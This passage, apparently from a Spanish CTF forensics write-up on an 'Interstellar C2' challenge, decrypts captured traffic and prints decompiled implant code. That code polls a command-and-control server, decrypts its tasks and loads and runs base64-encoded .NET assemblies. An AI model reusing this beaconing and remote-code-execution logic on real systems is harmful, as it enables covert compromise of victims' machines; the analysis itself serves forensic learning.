AQg0iylhuABUGlAI3OroAzODYLCQAOhHjwI1ICGHS6jPuKbTcJWNEKGNzE4eqzeQp6BPCjdxj4/u4sBao4ST+mvo8rAEh3kxTiqgCoL1KCTkj6t4UcFV0Bu7F0/QNR1IQemtEzQAAAAABJRU5ErkJggg==","iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAMAAACelLz8AAAAXVBMVEWnp6f///8rLi3p6en8/Py9vb2wsLC6urrLy8vS0tLv7+/W1tY0NzaYmJh5enouMTBmaGc6PDuEhISjo6OLi4udnp1BREN+f35PUlFxcnJZW1pMTk5cXl2RkZE3OjlmWTrgAAAA2ElEQVQokX2S2xKDIAxEIwgq4gUVq7b0/z+zQMCB6rgv0ZyRXUOgCBIt4wCctSJ2AAtlcIrRBJU1ZKrLiMoK/lSViK4EmUX1ldgzHaJ3BIBa5LN1+D5/pDy6aXE5CxCutShkB3F6O2RB48pEZG+L9oRIjxrw5+mBkHU3BlGPfw7cW40k0csjjvYmJcRkUbeEfGOTh9TDicYIcOSzOonUEGI0wW3NQ7jwIjzpYLdHJ4GDWsYNvdQUCYvjnQ41DGrr52y8D5fydJUPC/C0Nm7Zkg8rmu3h3Yr+ANAgB/2vh2bMAAAAAElFTkSuQmCC","iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAA+VBMVEX////p6en6+vr29va8vLzq3MWkgFPt38rv7+/g4ODJycnj4+Pl173g0LSZZir59/XYx6WohlvNroXw4sqjdDu2mG3NvJMRDhPTw53Cq4LZ2dmSXR7by6zRv5r06Netj2fXy7ugd0SQWRnKt5DBpXnk18O8uLOnnpG1qJm+o32ZaC9ucHWQkpael43Yw6etg062mZiumHthYWXYxKjUxLDTz8nm1LG5n32ojW2tnoq9mm4wLjJUUlQnJSheV065r6NrY1eDg4aSZzXIt6AfGxzCn3N8WzU1KR+BViRQNxt6ZUqsi4RBMTHJtbWfeGgdDQ22jlyqfUW8n4zo5IpYAAACJ0lEQVQ4ja2T63uaMBjFQQwXTWhCkEYTik7t0Hbi1FrFrje1u7gL9v//Y/ZCfdR2+7Rn54s8nJ8nyXmDpv1HnUyuzULR5OStV7pmYPTG6AxkDXosMtmydOzXKGlzay8epilzDkCTEUIwQmBBgGUhhEknPWQ0mcqBIqEAOOco9NYsKh378/vlyyJcffv6xc08yCgI2wwBUPFqvnoBBo+fn1au9Lw0M2GVUtSjOTBe4gkCWShptbaPPkSkmc8MCBBUYUWVhTAIoXaWKuL5rl8AuqazHBAUnXFMciLNQihjDGukSQEUCaFC/BkXm80yZT1znsh1dgBIoLD262dAFKFJkv7QbnFbptnWnwEwqwtKlNp8B0BBRrJN4HnoSwhoxbZm39XyNfDZZkNo3iUn2WA4HEiZ+H3WMDSjYdYpzXc3zf2i6bXrutL1+2asQ1H6ORAE6qe4ADgcty6ldN3WRwiAUTpACAspGBfvdptdmBTpvJOyFVXsYhYGEG0FVRH04eLy8uI9hj13ZJ9V9N04DSdmJgUAL0YPD6ObqaJUmOyuur8yRqPMYKdqevtpdLO4n1Ih6rOyYxxujOHMewJOS1enp4sBpWFQi6tHPhDQRigonSoF/w+DILp65WulKxYEQShEkggBT4I5pddANerA+6C39YvfWqS/ufj2uVmDvrw09Wi7HrFdBccRlfks/2ryD2QW7ys4IvRGpbxTpfGnn5/E1neyjb/Y/6zfsC5Em3hFDfYAAAAASUVORK5CYII="49395491SGMI'  
+</code></pre></div><h3 id="ejecución-de-comandos">Ejecución de comandos</h3><p>Esto parece una cadena aleatoria, pero hay partes que son relevantes. De hecho, el programa utiliza RegEx para analizar esta cadena y tomar valores específicos. Por ejemplo, hay una nueva clave AES entre <code>NEWKEY8839394</code> y <code>4939388YEKWEN</code> (la misma cadena al revés), que es <code>nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=</code>. También podemos ver más URLs. Por ejemplo, la siguiente petición va a:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/Kikelia/Jacinthe/Adorne/Kariotta/Lonee/Krystalle/4b6ab472-7d73-4a7e-95d0-2f691d8424dc/?dVfhJmc2ciKvPOC  
+</code></pre></div><p>Y todas estas cadenas aparecen en el <em>payload</em> anterior. Entonces, el programa entra en <code>ImplantCore</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">ImplantCore</span><span class="mtk1">(</span><span class="mtk5">string</span><span class="mtk1"> baseURL, </span><span class="mtk5">string</span><span class="mtk1"> RandomURI, </span><span class="mtk5">string</span><span class="mtk1"> stringURLS, </span><span class="mtk5">string</span><span class="mtk1"> KillDate, </span><span class="mtk5">string</span><span class="mtk1"> Sleep, </span><span class="mtk5">string</span><span class="mtk1"> Key, </span><span class="mtk5">string</span><span class="mtk1"> stringIMGS, </span><span class="mtk5">string</span><span class="mtk1"> Jitter)</span>  
+<span class="mtk1">  {</span>
+<span class="mtk1">    UrlGen.</span><span class="mtk8">Init</span><span class="mtk1">(stringURLS, RandomURI, baseURL);</span>
+<span class="mtk1">    ImgGen.</span><span class="mtk8">Init</span><span class="mtk1">(stringIMGS);</span>
+<span class="mtk1">    pKey </span><span class="mtk5">=</span><span class="mtk1"> Key;</span>
+<span class="mtk1">    </span><span class="mtk5">int</span><span class="mtk1"> num </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">5</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">Regex</span><span class="mtk1"> regex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"(?&lt;t&gt;[0-9]{1,9})(?&lt;u&gt;[h,m,s]{0,1})"</span><span class="mtk1">, RegexOptions.IgnoreCase </span><span class="mtk5">|</span><span class="mtk1"> RegexOptions.Compiled);</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">Match</span><span class="mtk1"> match </span><span class="mtk5">=</span><span class="mtk1"> regex.</span><span class="mtk8">Match</span><span class="mtk1">(Sleep);</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (match.Success)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      num </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">Parse_Beacon_Time</span><span class="mtk1">(match.Groups[</span><span class="mtk4">"t"</span><span class="mtk1">].Value, match.Groups[</span><span class="mtk4">"u"</span><span class="mtk1">].Value);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">StringWriter</span><span class="mtk1"> stringWriter </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">StringWriter</span><span class="mtk1">();</span>
+<span class="mtk1">    Console.</span><span class="mtk8">SetOut</span><span class="mtk1">(stringWriter);</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">ManualResetEvent</span><span class="mtk1"> manualResetEvent </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">ManualResetEvent</span><span class="mtk1">(initialState: </span><span class="mtk6">false</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">StringBuilder</span><span class="mtk1"> stringBuilder </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">StringBuilder</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk5">double</span><span class="mtk1"> result </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0.0</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">double.</span><span class="mtk8">TryParse</span><span class="mtk1">(Jitter, NumberStyles.Any, CultureInfo.InvariantCu</span><span class="mtk1">lture, </span><span class="mtk5">out</span><span class="mtk1"> result))</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      result </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0.2</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> cmd;</span>
+<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">manualResetEvent.</span><span class="mtk8">WaitOne</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Random</span><span class="mtk1">().</span><span class="mtk8">Next</span><span class="mtk1">((</span><span class="mtk5">int</span><span class="mtk1">)((</span><span class="mtk5">double</span><span class="mtk1">)(num </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">1000</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk6">1.0</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> result)), (</span><span class="mtk5">int</span><span class="mtk1">)((</span><span class="mtk5">double</span><span class="mtk1">)(num </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">1000</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk6">1.0</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> result)))))</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (DateTime.</span><span class="mtk8">ParseExact</span><span class="mtk1">(KillDate, </span><span class="mtk4">"yyyy-MM-dd"</span><span class="mtk1">, CultureInfo.InvariantCulture) </span><span class="mtk5">&lt;</span><span class="mtk1"> DateTime.Now)</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        Run </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
+<span class="mtk1">        manualResetEvent.</span><span class="mtk8">Set</span><span class="mtk1">();</span>
+<span class="mtk1">        </span><span class="mtk5">continue</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      stringBuilder.Length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">try</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk5">string</span><span class="mtk1"> text </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1">;</span>
+<span class="mtk1">        cmd </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">;</span>
+<span class="mtk1">        </span><span class="mtk5">try</span>
+<span class="mtk1">        {</span>
+<span class="mtk1">          cmd </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">GetWebRequest</span><span class="mtk1">(</span><span class="mtk6">null</span><span class="mtk1">).</span><span class="mtk8">DownloadString</span><span class="mtk1">(UrlGen.</span><span class="mtk8">GenerateUrl</span><span class="mtk1">());</span>
+<span class="mtk1">          text </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">Decryption</span><span class="mtk1">(Key, cmd).</span><span class="mtk8">Replace</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\0</span><span class="mtk4">"</span><span class="mtk1">, string.Empty);</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">        </span><span class="mtk5">catch</span>
+<span class="mtk1">        {</span>
+<span class="mtk1">          </span><span class="mtk5">goto</span><span class="mtk1"> end_IL_00f1;</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">text.</span><span class="mtk8">ToLower</span><span class="mtk1">().</span><span class="mtk8">StartsWith</span><span class="mtk1">(</span><span class="mtk4">"multicmd"</span><span class="mtk1">))</span>
+<span class="mtk1">        {</span>
+<span class="mtk1">          </span><span class="mtk5">continue</span><span class="mtk1">;</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">        </span><span class="mtk5">string</span><span class="mtk1"> text2 </span><span class="mtk5">=</span><span class="mtk1"> text.</span><span class="mtk8">Replace</span><span class="mtk1">(</span><span class="mtk4">"multicmd"</span><span class="mtk1">, </span><span class="mtk4">""</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk5">string</span><span class="mtk1">[] array </span><span class="mtk5">=</span><span class="mtk1"> text2.</span><span class="mtk8">Split</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">] { </span><span class="mtk4">"!d-3dion@LD!-d"</span><span class="mtk1"> }, StringSplitOptions.RemoveEmptyEntries);</span>
+<span class="mtk1">        </span><span class="mtk5">string</span><span class="mtk1">[] array2 </span><span class="mtk5">=</span><span class="mtk1"> array;</span>
+<span class="mtk1">        </span><span class="mtk5">foreach</span><span class="mtk1"> (</span><span class="mtk5">string</span><span class="mtk1"> text3 </span><span class="mtk5">in</span><span class="mtk1"> array2)</span>
+<span class="mtk1">        {</span>
+<span class="mtk1">          taskId </span><span class="mtk5">=</span><span class="mtk1"> text3.</span><span class="mtk8">Substring</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">5</span><span class="mtk1">);</span>
+<span class="mtk1">          cmd </span><span class="mtk5">=</span><span class="mtk1"> text3.</span><span class="mtk8">Substring</span><span class="mtk1">(</span><span class="mtk6">5</span><span class="mtk1">, text3.Length </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">5</span><span class="mtk1">);</span>
+<span class="mtk1">          </span><span class="mtk5">if</span><span class="mtk1"> (cmd.</span><span class="mtk8">ToLower</span><span class="mtk1">().</span><span class="mtk8">StartsWith</span><span class="mtk1">(</span><span class="mtk4">"exit"</span><span class="mtk1">))</span>
+<span class="mtk1">          {</span>
+<span class="mtk1">            Run </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
+<span class="mtk1">            manualResetEvent.</span><span class="mtk8">Set</span><span class="mtk1">();</span>
+<span class="mtk1">            </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">          }</span>
+<span class="mtk1">          </span><span class="mtk5">if</span><span class="mtk1"> (cmd.</span><span class="mtk8">ToLower</span><span class="mtk1">().</span><span class="mtk8">StartsWith</span><span class="mtk1">(</span><span class="mtk4">"loadmodule"</span><span class="mtk1">))</span>
+<span class="mtk1">          {</span>
+<span class="mtk1">            </span><span class="mtk5">string</span><span class="mtk1"> s </span><span class="mtk5">=</span><span class="mtk1"> Regex.</span><span class="mtk8">Replace</span><span class="mtk1">(cmd, </span><span class="mtk4">"loadmodule"</span><span class="mtk1">, </span><span class="mtk4">""</span><span class="mtk1">, RegexOptions.IgnoreCase);</span>
+<span class="mtk1">            </span><span class="mtk8 mtku">Assembly</span><span class="mtk1"> assembly </span><span class="mtk5">=</span><span class="mtk1"> Assembly.</span><span class="mtk8">Load</span><span class="mtk1">(Convert.</span><span class="mtk8">FromBase64String</span><span class="mtk1">(s));</span>
+<span class="mtk1">            </span><span class="mtk8">Exec</span><span class="mtk1">(stringBuilder.</span><span class="mtk8">ToString</span><span class="mtk1">(), taskId, Key);</span>
+<span class="mtk1">          }</span>
+<span class="mtk1">          </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (cmd.</span><span class="mtk8">ToLower</span><span class="mtk1">().</span><span class="mtk8">StartsWith</span><span class="mtk1">(</span><span class="mtk4">"run-dll-background"</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> cmd.</span><span class="mtk8">ToLower</span><span class="mtk1">().</span><span class="mtk8">StartsWith</span><span class="mtk1">(</span><span class="mtk4">"run-exe-background"</span><span class="mtk1">))</span>
+<span class="mtk1">          {</span>
+<span class="mtk1">            </span><span class="mtk8 mtku">Thread</span><span class="mtk1"> thread </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Thread</span><span class="mtk1">((</span><span class="mtk8 mtku">ThreadStart</span><span class="mtk1">)</span><span class="mtk5">delegate</span>
+<span class="mtk1">            {</span>
+<span class="mtk1">              </span><span class="mtk8">rAsm</span><span class="mtk1">(cmd);</span>
+<span class="mtk1">            });</span>
+<span class="mtk1">            </span><span class="mtk8">Exec</span><span class="mtk1">(</span><span class="mtk4">"[+] Running background task"</span><span class="mtk1">, taskId, Key);</span>
+<span class="mtk1">            thread.</span><span class="mtk8">Start</span><span class="mtk1">();</span>
+<span class="mtk1">          }</span>
+<span class="mtk1">          </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (cmd.</span><span class="mtk8">ToLower</span><span class="mtk1">().</span><span class="mtk8">StartsWith</span><span class="mtk1">(</span><span class="mtk4">"run-dll"</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> cmd.</span><span class="mtk8">ToLower</span><span class="mtk1">().</span><span class="mtk8">StartsWith</span><span class="mtk1">(</span><span class="mtk4">"run-exe"</span><span class="mtk1">))</span>
+<span class="mtk1">          {</span>
+<span class="mtk1">            stringBuilder.</span><span class="mtk8">AppendLine</span><span class="mtk1">(</span><span class="mtk8">rAsm</span><span class="mtk1">(cmd));</span>
+<span class="mtk1">          }</span>
+<span class="mtk1">          </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (cmd.</span><span class="mtk8">ToLower</span><span class="mtk1">().</span><span class="mtk8">StartsWith</span><span class="mtk1">(</span><span class="mtk4">"beacon"</span><span class="mtk1">))</span>
+<span class="mtk1">          {</span>
+<span class="mtk1">            </span><span class="mtk8 mtku">Regex</span><span class="mtk1"> regex2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"(?&lt;=(beacon)</span><span class="mtk6">\\</span><span class="mtk4">s{1,})(?&lt;t&gt;[0-9]{1,9})(?&lt;u&gt;[h,m,s]{0,1})"</span><span class="mtk1">, RegexOptions.IgnoreCase </span><span class="mtk5">|</span><span class="mtk1"> RegexOptions.Compiled);</span>
+<span class="mtk1">            </span><span class="mtk8 mtku">Match</span><span class="mtk1"> match2 </span><span class="mtk5">=</span><span class="mtk1"> regex2.</span><span class="mtk8">Match</span><span class="mtk1">(text3);</span>
+<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (match2.Success)</span>
+<span class="mtk1">            {</span>
+<span class="mtk1">              num </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">Parse_Beacon_Time</span><span class="mtk1">(match2.Groups[</span><span class="mtk4">"t"</span><span class="mtk1">].Value, match2.Groups[</span><span class="mtk4">"u"</span><span class="mtk1">].Value);</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            </span><span class="mtk5">else</span>
+<span class="mtk1">            {</span>
+<span class="mtk1">              stringBuilder.</span><span class="mtk8">AppendLine</span><span class="mtk1">(</span><span class="mtk4">$"[X] Invalid time </span><span class="mtk6">\"</span><span class="mtk4">{</span><span class="mtk1">text3</span><span class="mtk4">}</span><span class="mtk6">\"</span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            </span><span class="mtk8">Exec</span><span class="mtk1">(</span><span class="mtk4">"Beacon set"</span><span class="mtk1">, taskId, Key);</span>
+<span class="mtk1">          }</span>
+<span class="mtk1">          </span><span class="mtk5">else</span>
+<span class="mtk1">          {</span>
+<span class="mtk1">            </span><span class="mtk5">string</span><span class="mtk1"> text4 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">rAsm</span><span class="mtk1">(</span><span class="mtk4">$"run-exe Core.Program Core {</span><span class="mtk1">cmd</span><span class="mtk4">}"</span><span class="mtk1">);</span>
+<span class="mtk1">          }</span>
+<span class="mtk1">          stringBuilder.</span><span class="mtk8">AppendLine</span><span class="mtk1">(stringWriter.</span><span class="mtk8">ToString</span><span class="mtk1">());</span>
+<span class="mtk1">          </span><span class="mtk8 mtku">StringBuilder</span><span class="mtk1"> stringBuilder2 </span><span class="mtk5">=</span><span class="mtk1"> stringWriter.</span><span class="mtk8">GetStringBuilder</span><span class="mtk1">();</span>
+<span class="mtk1">          stringBuilder2.</span><span class="mtk8">Remove</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, stringBuilder2.Length);</span>
+<span class="mtk1">          </span><span class="mtk5">if</span><span class="mtk1"> (stringBuilder.Length </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">)</span>
+<span class="mtk1">          {</span>
+<span class="mtk1">            </span><span class="mtk8">Exec</span><span class="mtk1">(stringBuilder.</span><span class="mtk8">ToString</span><span class="mtk1">(), taskId, Key);</span>
+<span class="mtk1">          }</span>
+<span class="mtk1">          stringBuilder.Length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">        end_IL_00f1:;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">NullReferenceException</span><span class="mtk1">)</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">WebException</span><span class="mtk1">)</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">Exception</span><span class="mtk1"> arg)</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk8">Exec</span><span class="mtk1">(</span><span class="mtk4">$"Error: {</span><span class="mtk1">stringBuilder</span><span class="mtk4">.</span><span class="mtk8">ToString</span><span class="mtk4">()} {</span><span class="mtk1">arg</span><span class="mtk4">}"</span><span class="mtk1">, </span><span class="mtk4">"Error"</span><span class="mtk1">, Key);</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">finally</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        stringBuilder.</span><span class="mtk8">AppendLine</span><span class="mtk1">(stringWriter.</span><span class="mtk8">ToString</span><span class="mtk1">());</span>
+<span class="mtk1">        </span><span class="mtk8 mtku">StringBuilder</span><span class="mtk1"> stringBuilder3 </span><span class="mtk5">=</span><span class="mtk1"> stringWriter.</span><span class="mtk8">GetStringBuilder</span><span class="mtk1">();</span>
+<span class="mtk1">        stringBuilder3.</span><span class="mtk8">Remove</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, stringBuilder3.Length);</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (stringBuilder.Length </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">)</span>
+<span class="mtk1">        {</span>
+<span class="mtk1">          </span><span class="mtk8">Exec</span><span class="mtk1">(stringBuilder.</span><span class="mtk8">ToString</span><span class="mtk1">(), </span><span class="mtk4">"99999"</span><span class="mtk1">, Key);</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">        stringBuilder.Length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+</code></pre></div><p>Esta función parece abrumadora, pero hay muchas líneas irrelevantes. De hecho, al principio hay muchas configuraciones, pero a continuación, se llama <code>GetWebRequest(null)</code> y guarda el resultado en <code>cmd</code> y lo descifra con <code>Decryption</code>. Esta es la próxima petición en Wireshark:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-7.webp" alt="Interstellar C2 7"></p><p>Podemos descifrar el <em>payload</em> como antes (con la nueva clave AES):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; key = b64d('nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=')
+&gt;&gt;&gt;
+&gt;&gt;&gt; with open('kikelia.b64') as f:
+...     enc = b64d(f.read())
+...
+&gt;&gt;&gt; iv, ct = enc[:16], enc[16:]
+&gt;&gt;&gt;
+&gt;&gt;&gt; cipher = AES.new(key, AES.MODE_CBC, iv)
+&gt;&gt;&gt; data = b64d(cipher.decrypt(ct))
+&gt;&gt;&gt; data[:20]
+b'multicmd00031loadmod'
+&gt;&gt;&gt; data[:100]
+b'multicmd00031loadmoduleTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  
+&gt;&gt;&gt; data[-100:]
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=!d-3dion@LD!-d00033loadpowerstatus'
+</code></pre></div><p>El <em>payload</em> anterior será procesado por la siguiente parte de <code>ImplantCore</code>. El <em>payload</em> anterior contiene <code>loadmodule</code>, entonces esta es la parte que se ejecutará:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">          // ...</span>
+
+<span class="mtk1">          </span><span class="mtk5">if</span><span class="mtk1"> (cmd.</span><span class="mtk8">ToLower</span><span class="mtk1">().</span><span class="mtk8">StartsWith</span><span class="mtk1">(</span><span class="mtk4">"loadmodule"</span><span class="mtk1">))</span>
+<span class="mtk1">          {</span>
+<span class="mtk1">            </span><span class="mtk5">string</span><span class="mtk1"> s </span><span class="mtk5">=</span><span class="mtk1"> Regex.</span><span class="mtk8">Replace</span><span class="mtk1">(cmd, </span><span class="mtk4">"loadmodule"</span><span class="mtk1">, </span><span class="mtk4">""</span><span class="mtk1">, RegexOptions.IgnoreCase);</span>  
+<span class="mtk1">            </span><span class="mtk8 mtku">Assembly</span><span class="mtk1"> assembly </span><span class="mtk5">=</span><span class="mtk1"> Assembly.</span><span class="mtk8">Load</span><span class="mtk1">(Convert.</span><span class="mtk8">FromBase64String</span><span class="mtk1">(s));</span>
+<span class="mtk1">            </span><span class="mtk8">Exec</span><span class="mtk1">(stringBuilder.</span><span class="mtk8">ToString</span><span class="mtk1">(), taskId, Key);</span>
+<span class="mtk1">          }</span>
+
+<span class="mtk3">          // ...</span>
+</code></pre></div><p>El programa limpia el <em>payload</em> para tomar solo los datos codificados en Base64. Podríamos hacer las mismas operaciones, pero el resultado será el mismo, por lo que tomaremos los datos codificados en Base64 y los decodificaremos a un archivo porque se trata de otro Windows PE:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; b64_data = data[23:-34]
+&gt;&gt;&gt; b64_data[:5]
+b'TVqQA'
+&gt;&gt;&gt; b64_data[-5:]
+b'AAAA='
+&gt;&gt;&gt; data = b64d(b64_data)
+&gt;&gt;&gt; data[:20]
+b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00'
+&gt;&gt;&gt; with open('asm.exe', 'wb') as f:
+...     f.write(data)
+...
+201746
+&gt;&gt;&gt; exit()
+
+<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">asm.exe</span>
+asm.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows  
+</code></pre></div><p>Como antes, esto está compilado en C# .NET, así que lo podemos descompilar:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">// Warning: Some assembly references could not be </span><span class="mtk3">resolved automatically. This might lead to incorre</span><span class="mtk3">ct decompilation of some parts,</span>
+<span class="mtk3">// for ex. property getter/setter access. To get o</span><span class="mtk3">ptimal decompilation results, please manually add </span><span class="mtk3">the missing references to the list of loaded assem</span><span class="mtk3">blies.</span>
+<span class="mtk3">// Core.Program</span>
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">;</span>
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">.</span><span class="mtk8 mtku">Collections</span><span class="mtk1">.</span><span class="mtk8 mtku">Generic</span><span class="mtk1">;</span>
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">.</span><span class="mtk8 mtku">Diagnostics</span><span class="mtk1">;</span>
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">.</span><span class="mtk8 mtku">Linq</span><span class="mtk1">;</span>
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">.</span><span class="mtk8 mtku">Reflection</span><span class="mtk1">;</span>
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">Core</span><span class="mtk1">;</span>
